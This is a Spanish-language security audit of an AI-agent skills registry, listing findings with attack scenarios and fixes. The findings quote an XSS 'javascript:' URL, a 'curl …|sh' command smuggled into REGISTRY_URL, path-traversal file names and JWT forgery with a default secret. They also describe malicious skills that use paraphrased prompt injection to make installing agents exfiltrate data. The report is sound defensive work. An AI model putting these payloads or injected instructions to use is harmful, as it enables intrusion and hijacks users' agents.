# Security Pass — CloudCode Skills Registry (Skill-store)

Fecha: 2026-10-13
Alcance revisado: PRD, TECH-DESIGN y ADRs (0007, 0009, 0010, 0016 leídos a fondo), specs OpenSpec (existencia), código fuente (auth, middleware, MCP, API REST, server actions, validación/ingesta de skills, CLI), tests (existencia y cobertura puntual), configuración (`.gitignore`, `.env*`, `docker-compose.yml`, `next.config.ts`), CI/CD (`.github/workflows`) y dependencias (`pnpm audit --prod`).
No revisado: contenido de los specs OpenSpec línea por línea, despliegue real en Vercel (variables de entorno de producción), UI de componentes más allá de sinks (`href`, `dangerouslySetInnerHTML`), tests E2E de `e2e/`. Los findings que dependen de eso llevan `Confidence` MEDIUM/LOW.

## Resumen ejecutivo

El sistema es un registro de skills (instrucciones que ejecutan agentes de IA) con catálogo público, panel admin, servidor MCP y CLI, autenticado con GitHub OAuth y PATs. Lo más serio: (1) el endpoint de mantenimiento que purga el rate limit es **público**, (2) existen **secretos por defecto conocidos** (`AUTH_SECRET`) que permitirían forjar sesiones si producción no define la variable, (3) `username` **no es único** y las rutas públicas resuelven skills por `owner/slug`, lo que habilita suplantación de un publicador (cadena de suministro hacia agentes), y (4) la pantalla de login del CLI **crea un PAT con scope write en cada GET** y lo entrega a cualquier puerto local. El control de acceso por dueño en MCP/admin está, en general, bien hecho.

## Fortalezas de seguridad

- PATs de 256 bits, guardados solo como SHA-256 (ADR-0010), mostrados una vez, con revocación, expiración y scopes `read/write/delete` verificados en `withAuthenticatedTool` (`src/lib/mcp/auth.ts`).
- Autorización por dueño consistente: toda mutación MCP y server action filtra por `ownerId` derivado del token/sesión, nunca del input (`findFirst({ id, ownerId })`); IDOR no encontrado en contexts/skills/groups.
- Visibilidad (`isPublic`/`isPaused`/`isArchived`) aplicada en catálogo, API REST y la mayoría de tools MCP; ideas privadas protegidas.
- Skills nuevas por MCP/UI/ingesta nacen privadas; borrado MCP exige `confirm:true` (ADR-0017).
- Filtro heurístico anti prompt-injection en `parseSkillMarkdown` (ADR-0016) y validación de frontmatter/semver con zod.
- Uso de Prisma (sin SQL crudo), sin `dangerouslySetInnerHTML`, `.env*` ignorado por git y no versionado, `rel="noopener noreferrer"` en enlaces externos.
- Estado `state` aleatorio de 128 bits verificado por el servidor local del CLI.

## Findings

### HIGH

**ID:** SEC-01
**Title:** Endpoint de purga de rate limits sin autenticación
**Severity:** HIGH (justificación: desactiva a demanda el único control anti-abuso del sistema y es invocable por GET, es decir, desde cualquier `<img>`/enlace)
**Confidence:** HIGH
**Category:** Broken access control / missing authentication
**Affected artifact:** Código, ADR-0007
**Location:** `src/app/api/maintenance/purge-rate-limits/route.ts` (GET y POST)
**Description:** El handler ejecuta `purgeExpiredRateLimits(maxAgeMs)` sin verificar identidad, secreto de cron ni origen. `maxAgeMs` lo controla el cliente.
**Evidence:** No hay `auth()`, ni header `Authorization`/`CRON_SECRET`, ni comprobación `x-vercel-cron`. `GET /api/maintenance/purge-rate-limits?maxAgeMs=1` borra todas las filas de `RateLimitHit` con más de 1 ms. El test `purge-route.test.ts` no contiene casos de 401/403.
**Attack scenario:** Un atacante llama al endpoint en bucle y luego dispara miles de requests a `/api/mcp` o `/api/skills/*`: el contador siempre vuelve a cero. También sirve para ataques CSRF por GET.
**Potential impact:** Anulación total del rate limiting (scraping, inflado de contadores, fuerza bruta de tokens sobre `/api/mcp`, presión sobre la base Neon free tier).
**Existing mitigation:** Ninguna.
**Recommended remediation:** Exigir `Authorization: Bearer ${CRON_SECRET}` (Vercel Cron lo envía) y rechazar con 401 si falta; eliminar el parámetro `maxAgeMs` del cliente o acotarlo a un mínimo (≥ ventana activa); dejar solo GET (cron) o solo POST.
**Suggested verification:** Test que verifique 401 sin header, 401 con secreto erróneo, 200 con secreto correcto, y que `maxAgeMs` < ventana se ignora.
**Required change type:** CODE FIX

---

**ID:** SEC-02
**Title:** Secretos de autenticación con valores por defecto conocidos si falta configuración
**Severity:** HIGH (justificación condicional: si producción arranca sin `AUTH_SECRET`, cualquiera puede forjar una sesión de cualquier usuario; no confirmado en el despliegue real)
**Confidence:** MEDIUM (falta verificar variables de producción en Vercel)
**Category:** Insecure defaults / secrets
**Affected artifact:** Código
**Location:** `src/lib/auth/config.ts` (`secret: process.env.AUTH_SECRET || 'dummy-auth-secret-…'`, `GITHUB_ID/SECRET` dummy), `src/lib/env.ts` (`.default('dummy-auth-secret…')`)
**Description:** El fallback del secreto de firma de JWT está en el repositorio. La validación de env (`validateEnv`) no falla cuando `AUTH_SECRET` no existe; solo `DATABASE_URL` es obligatoria.
**Evidence:** `AUTH_SECRET: z.string().optional().default('dummy-auth-secret-for-local-testing-32-chars-long-min')`. `createAuthJWT` usa ese secreto con salt `authjs.session-token`, el mismo formato que verifica `src/middleware.ts` y que Auth.js acepta como cookie de sesión.
**Attack scenario:** Con el repo (o el valor por defecto) el atacante genera un JWT `{userId, githubId, username}` de cualquier usuario y lo envía como cookie; el middleware lo acepta y las server actions (`auth()`) lo aceptan. Acceso total a panel, creación de PATs write/delete y publicación de skills como la víctima.
**Potential impact:** Toma de cuenta de cualquier usuario, incluidos publicadores de skills públicas.
**Existing mitigation:** `.env.example` indica generar el secreto; no hay verificación en runtime.
**Recommended remediation:** Quitar los defaults de `AUTH_SECRET`/`GITHUB_*` en código no-test; fallar el arranque si `NODE_ENV === 'production'` y falta o es el valor conocido; que los tests inyecten el secreto por `vitest.config`/helpers. Confirmar además que Vercel tiene un `AUTH_SECRET` propio (y rotarlo si alguna vez estuvo ausente).
**Suggested verification:** Test de `validateEnv` en producción sin `AUTH_SECRET` que debe lanzar; revisar `vercel env ls`.
**Required change type:** CODE FIX

---

**ID:** SEC-03
**Title:** `username` no único: suplantación de `owner/slug` en rutas públicas, MCP y CLI
**Severity:** HIGH (justificación: las skills son instrucciones que un agente de IA ejecuta; instalar la skill equivocada bajo un nombre de confianza es ejecución de instrucciones del atacante)
**Confidence:** MEDIUM (requiere que un usuario renombre/borre su cuenta de GitHub y otro tome el nombre; no probado contra la BD)
**Category:** Identity / business logic / supply chain
**Affected artifact:** Modelo de datos (ADR-0003), código
**Location:** `prisma/schema.prisma` (`username String` sin `@unique`), `src/lib/catalog/queries.ts:getSkillByOwnerAndSlug`, `src/lib/mcp/tools.ts` (`findFirst({ slug, owner: { username } })`), `src/lib/auth/user-sync.ts`, `src/lib/skills/ingest.ts:getOrCreateUser`
**Description:** La identidad pública de una skill es `username/slug`, pero solo `githubId` es único. Al renombrarse una cuenta de GitHub el nombre queda libre; otro usuario con ese nombre crea un `User` nuevo con el mismo `username`. `findFirst` devuelve una fila arbitraria entre ambos dueños. Además `syncUserFromGitHub` solo actualiza el nombre en el siguiente login, así que el registro puede quedar con nombres obsoletos.
**Evidence:** `username  String` (schema línea 16); consultas por `owner: { username }` con `findFirst`; `getOrCreateUser` hace `findFirst({ OR: [{ githubId }, { username }] })` (puede enlazar la ingesta al usuario equivocado).
**Attack scenario:** Un publicador popular `acme` renombra su cuenta. El atacante registra la cuenta `acme`, publica `acme/code-review` pública. `npx skills add acme/code-review` o `get_skill` pueden resolver la skill del atacante (o alternarse con la legítima según el orden de Postgres).
**Potential impact:** Entrega de skills maliciosas a usuarios que confían en un nombre; en una ingesta, escritura sobre el dueño equivocado.
**Existing mitigation:** Filtro heurístico de prompt injection (fácilmente evadible); skills nuevas nacen privadas (el atacante igual puede hacerlas públicas).
**Recommended remediation:** Hacer `username` único (migración con deduplicación previa); al login, si el `username` ya pertenece a otro `githubId`, renombrar/rechazar; en `getOrCreateUser` buscar solo por `githubId`.
**Suggested verification:** Test: dos `githubId` distintos con el mismo `username` → el segundo login falla o recibe un nombre distinto; test de unicidad en `getOrCreateUser`.
**Required change type:** DESIGN / ADR CHANGE (cambia el modelo de identidad pública definido en ADR-0003; la migración y la política de colisión son decisión humana)

### MEDIUM

**ID:** SEC-04
**Title:** `/admin/cli-auth` crea un PAT write en cada GET y lo envía a cualquier puerto local
**Severity:** MEDIUM
**Confidence:** MEDIUM
**Category:** CSRF-like state change / token handling
**Affected artifact:** Código, ADR-0013
**Location:** `src/app/admin/cli-auth/page.tsx`, `CliAuthCallback.tsx`; `src/lib/cli/commands.ts` (servidor local, `Access-Control-Allow-Origin: *`)
**Description:** Un Server Component con side effect (`createAccessToken`) se ejecuta con solo abrir la URL logueado. No hay confirmación del usuario ni verificación de que `port`/`state` provengan del CLI propio. El token (scopes `read`,`write`, sin expiración) se manda por `fetch` a `http://localhost:<port>/callback` y, si falla, se muestra en pantalla.
**Evidence:** `const { rawToken } = await createAccessToken(session.user.id, { label: 'CLI login…', scopes: ['read','write'] })` sin `expiresAt`; `port` solo se valida como entero.
**Attack scenario:** (a) Un enlace o iframe a `/admin/cli-auth?port=…&state=x` crea un PAT por visita (acumulación; no hay límite). (b) Un proceso local de otro usuario del equipo en el mismo host escucha en un puerto y recibe un PAT write con solo hacer que la víctima abra ese enlace.
**Potential impact:** Creación de tokens no consentidos y entrega de credenciales de escritura a un tercero local; publicación de skills como la víctima.
**Existing mitigation:** Requiere sesión; el CLI valida `state`.
**Recommended remediation:** Mostrar una pantalla de consentimiento con botón (acción POST con protección CSRF de server action) que muestre el puerto destino; asignar `expiresAt` corto (p. ej. 30–90 días) a los tokens del CLI; revocar el token previo "CLI login" del mismo dispositivo; restringir CORS del callback al origen del registro en lugar de `*`; `X-Frame-Options`/`frame-ancestors` en `/admin/*`.
**Suggested verification:** Test que una GET a la página no cree tokens; E2E del flujo de login con consentimiento.
**Required change type:** CODE FIX

---

**ID:** SEC-05
**Title:** Fuga de metadatos de skills privadas/pausadas y contadores manipulables sin visibilidad
**Severity:** MEDIUM
**Confidence:** HIGH
**Category:** Broken access control / information disclosure
**Affected artifact:** Código, ADR-0011 / ADR-0009
**Location:** `src/lib/mcp/tools.ts:handleCheckUpdates`, `handleInstallSkill` (rama de fallback); `src/lib/catalog/counters.ts`; `src/app/skills/actions.ts`
**Description:** Estas rutas son anónimas y filtran solo por `isArchived`/slug, sin `isPublic`/`isPaused`. `check_updates` devuelve changelog y `gitTag` de skills privadas; `install_skill` devuelve el nombre, versión y contadores y además incrementa `installsCount`; los contadores de descargas/instalaciones aceptan cualquier `owner/slug` aunque sea privado.
**Evidence:** `handleCheckUpdates`: `findFirst({ where: { slug, owner: { username } } })` sin visibilidad; `incrementInstallsCount` igual. ADR-0011 declara que las skills privadas/pausadas no deben ser alcanzables por terceros.
**Attack scenario:** Un tercero enumera `owner/slug` (nombres predecibles) y obtiene versión, changelog y nombre de skills privadas de una empresa.
**Potential impact:** Divulgación de existencia y metadatos de trabajo interno; inflado de métricas.
**Existing mitigation:** `get_skill`/`list_skills`/API REST sí filtran correctamente.
**Recommended remediation:** Aplicar el mismo filtro `isPublic: true, isPaused: false` (o dueño autenticado) en `check_updates`, `install_skill` y contadores.
**Suggested verification:** Tests anónimos contra una skill privada y otra pausada en cada tool/ruta, esperando "no encontrada".
**Required change type:** CODE FIX

---

**ID:** SEC-06
**Title:** Rate limiting evadible: IP tomada de `X-Forwarded-For` sin confianza de proxy
**Severity:** MEDIUM
**Confidence:** MEDIUM (depende de cómo Vercel reescriba el header en producción)
**Category:** Resource exhaustion / insecure defaults
**Affected artifact:** Código, ADR-0007
**Location:** `src/lib/rate-limit/index.ts:getClientIp`; `src/app/skills/actions.ts` (server actions sin rate limit)
**Description:** Se usa el primer valor de `x-forwarded-for` (controlable por el cliente en muchos despliegues), luego `x-real-ip`/`cf-connecting-ip`, y cae a `127.0.0.1` (un único bucket compartido, DoS entre usuarios legítimos si el header falta). Las server actions `incrementDownloadAction/InstallAction` no pasan por el limitador. Cada request legítimo hace además un `count` + `create` en Postgres, que bajo abuso es el cuello de botella.
**Evidence:** Código citado; ninguna llamada a `rateLimitGuard` en `src/app/skills/actions.ts`.
**Attack scenario:** Un cliente rota `X-Forwarded-For` en cada request y esquiva el límite; o satura la tabla `RateLimitHit`.
**Potential impact:** Abuso de `/api/mcp` (que también valida tokens), inflado de contadores, consumo de la base free tier.
**Existing mitigation:** Límite básico por IP (aceptado en ADR-0007 como "solo abuso obvio").
**Recommended remediation:** Usar la última IP de la cadena propia de Vercel (o `request.ip`/`x-vercel-forwarded-for`), documentar el supuesto de proxy; aplicar el limitador a las server actions; fallar cerrado cuando no hay IP.
**Suggested verification:** Test con `X-Forwarded-For` falso rotativo; test de las actions con el límite excedido.
**Required change type:** CODE FIX (el nivel de protección esperado puede requerir ACCEPT RISK explícito si se mantiene el diseño del ADR-0007)

---

**ID:** SEC-07
**Title:** Esquemas `javascript:` aceptados en enlaces públicos (`link`, `repositoryUrl`)
**Severity:** MEDIUM
**Confidence:** MEDIUM (zod acepta el esquema — verificado; la ejecución depende del navegador y del manejo de React 19)
**Category:** Stored XSS / unsafe input handling
**Affected artifact:** Código
**Location:** `src/lib/validations/context.ts:39,57`, `src/lib/validations/skill.ts`, `src/lib/validations/mcp.ts` (`z.string().url()`); sinks en `ContextCard.tsx:73`, `contexts/[id]/page.tsx:71`, `SkillDetail.tsx:126`, `SkillList.tsx:144`, `ContextList.tsx:171`
**Description:** `z.string().url()` valida con `new URL()`, por lo que `javascript:alert(1)` es válido. Esas URL se renderizan en `href` de páginas públicas (referencias externas son siempre públicas).
**Evidence:** Ejecutado en el repo: `z.string().url().safeParse('javascript:alert(1)').success === true`.
**Attack scenario:** Cualquier usuario autenticado crea una referencia externa con `link: javascript:…`; un visitante que la abre y hace clic ejecuta script en el origen del registro (con `target=_blank` el alcance del XSS puede ser menor, pero se puede perder la sesión de un administrador/usuario logueado).
**Potential impact:** XSS almacenado en el origen que gestiona sesiones y PATs.
**Existing mitigation:** `rel="noopener noreferrer"`; React escapa el texto.
**Recommended remediation:** Un `refine` compartido que exija `protocol === 'https:' || 'http:'` en todos los campos URL; sanitizar también al renderizar.
**Suggested verification:** Test de validación que rechace `javascript:`, `data:` y `vbscript:`.
**Required change type:** CODE FIX

---

**ID:** SEC-08
**Title:** `skills pull` escribe archivos con rutas controladas por el servidor sin contención en el directorio destino
**Severity:** MEDIUM
**Confidence:** MEDIUM (hoy MCP solo guarda `SKILL.md`; la ingesta desde el repo guarda rutas relativas; el riesgo aparece con un registro comprometido o `REGISTRY_URL` apuntando a un servidor hostil)
**Category:** Path traversal / unsafe file handling
**Affected artifact:** Código (CLI)
**Location:** `src/lib/cli/commands.ts:handlePull` (`path.join(destDir, relPath)`), `slug` tomado del argumento, y la versión equivalente en `handlePullGroup`
**Description:** `relPath` proviene de `files` en la respuesta del registro y se une al destino sin verificar que quede dentro de `destDir`; `../../.bashrc` o una ruta absoluta (via `path.join` no, pero `../` sí) escribe fuera del directorio.
**Evidence:** `const filePath = path.join(destDir, relPath); fs.writeFileSync(filePath, …)`. No hay `path.relative` ni rechazo de segmentos `..`. Además, el nombre de skill de `get_skill` con `owner`/`slug` arbitrarios entra a `path.join('.claude','skills', slug)`.
**Attack scenario:** Un registro (o un MITM en `http://`, que es el esquema por defecto de `REGISTRY_URL`) devuelve una versión con `files: { "../../.zshrc": "…" }`; `skills pull` sobrescribe archivos del usuario.
**Potential impact:** Escritura arbitraria de archivos en el equipo del desarrollador.
**Existing mitigation:** Hoy el servidor limita los archivos que acepta al publicar por MCP; la ruta de ingesta es de confianza.
**Recommended remediation:** Resolver `path.resolve(destDir, relPath)` y rechazar si no empieza por `destDir + path.sep`; validar `slug` con la misma regex que el servidor; exigir `https:` salvo para `localhost`.
**Suggested verification:** Test de `handlePull` con `files` que contengan `../` y rutas absolutas → debe fallar sin escribir.
**Required change type:** CODE FIX

---

**ID:** SEC-09
**Title:** Dependencias con vulnerabilidades conocidas (Next.js 16.3.6 y transitivas)
**Severity:** MEDIUM
**Confidence:** MEDIUM
**Category:** Dependency / supply-chain risk
**Affected artifact:** `package.json`, `pnpm-lock.yaml`
**Location:** `next@16.3.6`, `sharp`, `source-map-js`, `deepmerge-ts`, `sprintf-js`
**Description:** `pnpm audit --prod` informa 10 vulnerabilidades (4 high, 5 moderate, 1 low). `next` < 16.3.8 incluye SSRF en Image Optimization (high), cache poisoning de SSG/ISR y fuga en rutas de metadata; `sharp`, `source-map-js` y `deepmerge-ts` son high transitivas.
**Evidence:** Salida de `pnpm audit --prod --json`; `next` fijado en `16.3.6`.
**Attack scenario:** El SSRF de optimización de imágenes solo aplica si `images.remotePatterns` permite orígenes remotos; `next.config.ts` está vacío, por lo que el vector principal parece no explotable hoy. El cache poisoning aplica a despliegues self-hosted (ADR-0008 apunta a Vercel).
**Potential impact:** Depende del vector; mayormente DoS o cache poisoning.
**Existing mitigation:** Despliegue en Vercel y config sin imágenes remotas.
**Recommended remediation:** Subir `next` a ≥ 16.3.8 y actualizar el lockfile; correr `pnpm audit` en CI.
**Suggested verification:** `pnpm audit --prod` sin high/critical.
**Required change type:** CODE FIX

### LOW

**ID:** SEC-10
**Title:** Token del CLI guardado con permisos por defecto
**Severity:** LOW
**Confidence:** HIGH
**Category:** Sensitive data exposure
**Affected artifact:** Código (CLI)
**Location:** `src/lib/cli/config.ts:saveStoredToken`
**Description:** `fs.writeFileSync` y `fs.mkdirSync` no fijan modo; con umask 022 el archivo `~/.config/cloudcode-skills/config.json` queda legible por otros usuarios del equipo.
**Evidence:** Ausencia de `mode: 0o600` / `0o700`.
**Attack scenario:** Otro usuario local lee el PAT write.
**Potential impact:** Uso del PAT para publicar/modificar skills.
**Existing mitigation:** Ninguna.
**Recommended remediation:** `writeFileSync(..., { mode: 0o600 })`, directorio `0o700`, y `chmod` si el archivo ya existía.
**Suggested verification:** Test que verifique el modo del archivo (`statSync().mode & 0o777 === 0o600`).
**Required change type:** CODE FIX

---

**ID:** SEC-11
**Title:** Sesiones JWT siguen válidas tras dar de baja la cuenta
**Severity:** LOW
**Confidence:** MEDIUM
**Category:** Session management
**Affected artifact:** Código, spec de autenticación
**Location:** `src/lib/auth/config.ts` (callbacks `jwt`/`session`), `src/lib/auth/account.ts`
**Description:** `deleteAccountService` borra PATs y archiva contenido pero conserva el `User`; la sesión JWT (hasta 30 días, sin revocación) sigue creando skills y PATs. El `jwt` callback además, si `syncUserFromGitHub` falla, devuelve el token sin `userId` y solo `console.error`.
**Evidence:** No hay comprobación de estado del usuario en `requireAuth()`.
**Attack scenario:** Un usuario dado de baja (o un atacante con la cookie robada) sigue operando durante la vigencia del JWT.
**Potential impact:** Persistencia de acceso post-baja.
**Existing mitigation:** PATs sí se eliminan; contenido previo queda archivado.
**Recommended remediation:** Añadir `deletedAt`/flag en `User` y verificarlo en `requireAuth` y el `jwt` callback; reducir `maxAge`.
**Suggested verification:** Test: tras `deleteAccountService`, `createSkillAction` debe fallar.
**Required change type:** SPEC CHANGE (definir comportamiento de baja) + CODE FIX

---

**ID:** SEC-12
**Title:** Filtro anti prompt-injection solo heurístico y limitado a `SKILL.md`
**Severity:** LOW (el riesgo de fondo es de producto; ver Gobernanza)
**Confidence:** MEDIUM
**Category:** Missing control / supply-chain for agent instructions
**Affected artifact:** ADR-0016, código
**Location:** `src/lib/skills/validation.ts:detectPromptInjectionPatterns`
**Description:** Regex en español/inglés fáciles de evadir (paráfrasis, otros idiomas, texto en imágenes/enlaces, instrucciones indirectas). Solo se aplica al contenido de `SKILL.md` recibido por contenido; los archivos adicionales ingeridos por `readSkillDirectoryFiles` (scripts, plantillas HTML) no pasan por él.
**Evidence:** `parseSkillMarkdown` llama el detector sobre `content`; `readSkillDirectoryFiles` lee todo sin filtrar.
**Attack scenario:** Un publicador malicioso sube una skill pública con instrucciones de exfiltración parafraseadas.
**Potential impact:** Compromiso del agente de quien instale la skill.
**Existing mitigation:** Nace privada, heurística, filtro por patrones.
**Recommended remediation:** Documentar que es defensa en profundidad, no un control de confianza; considerar revisión/aprobación antes de hacer pública una skill, o marcar skills de terceros como no verificadas.
**Suggested verification:** Suite de payloads de evasión conocidos y sus resultados esperados.
**Required change type:** PRODUCT / REQUIREMENT CHANGE

---

**ID:** SEC-13
**Title:** Credenciales por defecto de Postgres expuestas en `docker-compose.yml` y CI
**Severity:** LOW
**Confidence:** HIGH
**Category:** Misconfiguration
**Affected artifact:** `docker-compose.yml`
**Location:** `docker-compose.yml` (`postgres/postgres`, puerto `5433:5432` publicado en todas las interfaces)
**Description:** En un equipo de desarrollo conectado a una red compartida, la base queda accesible con credenciales triviales.
**Evidence:** `ports: - "5433:5432"` sin `127.0.0.1:`.
**Attack scenario:** Alguien en la misma red accede a la BD local (que puede contener datos reales de importación).
**Potential impact:** Lectura/escritura de datos locales.
**Existing mitigation:** Es un entorno de desarrollo.
**Recommended remediation:** `"127.0.0.1:5433:5432"`.
**Suggested verification:** `ss -ltn` muestra solo 127.0.0.1.
**Required change type:** CODE FIX

---

**ID:** SEC-14
**Title:** Inyección de shell en `openDefaultBrowser` con URL interpolada
**Severity:** LOW
**Confidence:** MEDIUM
**Category:** Command execution
**Affected artifact:** Código (CLI)
**Location:** `src/lib/cli/commands.ts:openDefaultBrowser` (`exec(\`xdg-open "${url}"\`)`)
**Description:** La URL incluye `REGISTRY_URL`/`--base-url`; una comilla en esa variable permite ejecutar comandos. Solo lo controla quien ya ejecuta el CLI, de modo que el impacto real es bajo.
**Evidence:** Uso de `exec` con interpolación en string en lugar de `execFile`.
**Attack scenario:** Un `.env`/script de CI manipulado inyecta `REGISTRY_URL='http://x";curl …|sh;"'`.
**Potential impact:** Ejecución de comandos con los privilegios del usuario.
**Existing mitigation:** Requiere control previo del entorno.
**Recommended remediation:** `execFile('xdg-open', [url])` (y `open`/`start` equivalentes) tras validar que la URL sea `http(s)`.
**Suggested verification:** Test con `"` en la URL: no debe invocar un shell.
**Required change type:** CODE FIX

### INFO

**ID:** SEC-15
**Title:** Cobertura de tests de seguridad y CI
**Severity:** INFO
**Confidence:** MEDIUM
**Category:** Tests / process
**Affected artifact:** `src/**/__tests__`, `.github/workflows/*`
**Location:** `src/app/api/maintenance/__tests__/purge-route.test.ts`, workflows
**Description:** Hay tests para tokens, scopes, ownership y visibilidad, pero ninguno para: autenticación de rutas de mantenimiento, `javascript:` en URLs, `..` en `handlePull`, visibilidad en `check_updates`/`install_skill`, colisión de `username`. Los workflows usan actions por tag (no SHA) y no ejecutan `pnpm audit`; `release-and-ingest.yml` ingiere a un Postgres efímero del runner (la ingesta no llega a producción, no es un riesgo de seguridad pero sí una inconsistencia de proceso).
**Evidence:** Revisión de los tests citados y de los workflows.
**Attack scenario:** n/a (brecha de verificación).
**Potential impact:** Regresiones silenciosas en los controles anteriores.
**Existing mitigation:** Suite unitaria amplia en autorización por dueño.
**Recommended remediation:** Añadir los tests nombrados en cada finding; fijar actions por SHA; `pnpm audit --prod --audit-level=high` en `validate-skills.yml`.
**Suggested verification:** CI falla si se reintroduce alguno de los casos.
**Required change type:** PROCESS / HARNESS CHANGE

## Prioridad

1. **SEC-01** (purga pública) y **SEC-02** (secretos por defecto): cambios pequeños, riesgo alto. Confirmar primero el `AUTH_SECRET` real en Vercel.
2. **SEC-05** y **SEC-07**: filtros de visibilidad y esquema de URL, sin decisiones de producto.
3. **SEC-04**, **SEC-08**, **SEC-10**, **SEC-14**: endurecimiento del flujo CLI en un mismo cambio.
4. **SEC-03**: requiere migración y decisión (hacerlo antes de abrir el registro a más publicadores).
5. **SEC-09** (actualizar Next.js) puede hacerse en paralelo; **SEC-06**, **SEC-11** después.
6. **SEC-12**, **SEC-13**, **SEC-15**: a conveniencia.

## Gobernanza / Decisión requerida

- **SEC-03** (`DESIGN / ADR CHANGE`): hacer `username` único cambia el modelo de identidad de ADR-0003 y obliga a decidir qué ocurre con colisiones existentes y con renombres de GitHub.
- **SEC-12** (`PRODUCT / REQUIREMENT CHANGE`): decidir si las skills públicas de terceros requieren revisión previa o etiquetado de "no verificada"; el filtro heurístico actual no sustituye esa decisión.
- **SEC-06**: si se decide mantener el rate limiting "básico" del ADR-0007 sin cambios, debe registrarse como `ACCEPT RISK` explícito por una persona.
- **SEC-11**: la política de baja de cuenta (¿se invalidan sesiones?) debe definirse en el spec `autenticacion` antes de implementar.
